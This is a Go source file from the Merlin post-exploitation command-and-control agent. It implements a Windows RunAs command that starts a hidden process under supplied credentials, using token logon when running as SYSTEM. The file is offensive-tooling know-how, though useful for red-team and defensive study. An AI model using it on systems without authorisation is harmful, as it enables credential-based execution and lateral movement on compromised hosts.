//go:build windows

/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2024 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

package commands

import (
	// Standard
	"fmt"
	"strings"
	"syscall"

	// X Packages
	"golang.org/x/sys/windows"

	// Merlin
	"github.com/Ne0nd0g/merlin-message/jobs"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/v2/cli"
	"github.com/Ne0nd0g/merlin-agent/v2/os/windows/pkg/processes"
	"github.com/Ne0nd0g/merlin-agent/v2/os/windows/pkg/tokens"
)

// RunAs creates a new process as the provided user
func RunAs(cmd jobs.Command) (results jobs.Results) {
	cli.Message(cli.DEBUG, fmt.Sprintf("entering RunAs() with %+v", cmd))

	// Username, Password, Application, Arguments
	if len(cmd.Args) < 3 {
		results.Stderr = fmt.Sprintf("expected 3+ arguments, received %d for RunAs command", len(cmd.Args))
		return
	}

	username := cmd.Args[0]
	password := cmd.Args[1]
	application := cmd.Args[2]
	var arguments string
	if len(cmd.Args) > 3 {
		arguments = strings.Join(cmd.Args[3:], " ")
	}

	// Determine if running as SYSTEM
	u, err := tokens.GetTokenUsername(windows.GetCurrentProcessToken())
	if err != nil {
		results.Stderr = err.Error()
		return
	}

	// If we are running as SYSTEM, we can't call CreateProcess, must call LogonUserA -> CreateProcessAsUserA/CreateProcessWithTokenW
	if u == "NT AUTHORITY\\SYSTEM" {
		hToken, err2 := tokens.LogonUser(username, password, "", tokens.LOGON32_LOGON_INTERACTIVE, tokens.LOGON32_PROVIDER_DEFAULT)
		if err2 != nil {
			results.Stderr = err2.Error()
			return
		}
		//results.Stdout, results.Stderr = tokens.CreateProcessWithToken(hToken, application, strings.Split(arguments, " "))
		var args []string
		if len(cmd.Args) > 3 {
			args = cmd.Args[3:]
		}

		attr := &syscall.SysProcAttr{
			HideWindow: true,
			Token:      syscall.Token(hToken),
		}
		results.Stdout, results.Stderr = executeCommandWithAttributes(application, args, attr)
		return
	}

	results.Stdout, results.Stderr = processes.CreateProcessWithLogon(username, "", password, application, arguments, processes.LOGON_WITH_PROFILE, true)

	return
}
